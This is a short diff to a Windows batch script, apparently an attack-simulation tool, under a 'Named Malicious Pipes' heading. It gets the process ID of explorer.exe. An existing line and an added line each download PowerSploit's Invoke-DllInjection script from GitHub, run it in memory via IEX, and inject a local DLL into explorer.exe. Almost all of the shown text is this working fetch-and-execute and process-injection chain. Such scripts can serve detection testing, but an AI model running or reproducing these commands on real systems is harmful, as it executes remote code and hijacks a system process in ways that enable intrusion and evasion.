@@ -26,5 +26,6 @@ ECHO [+] Named Malicious Pipes
 ECHO -------------------------------------------------------------------
 for /f "tokens=2" %%a in ('tasklist^|find /i "explorer"') do (set pid=%%a)
 echo %PID%
+echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rajrakeshdr/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1'); $m = Invoke-DllInjection -ProcessID %PID% -Dll %Utilities%Dll1_64.dll; $m | powershell.exe -
 cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rajrakeshdr/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1'); $m = Invoke-DllInjection -ProcessID %PID% -Dll %Utilities%Dll1_64.dll; $m
 ECHO.
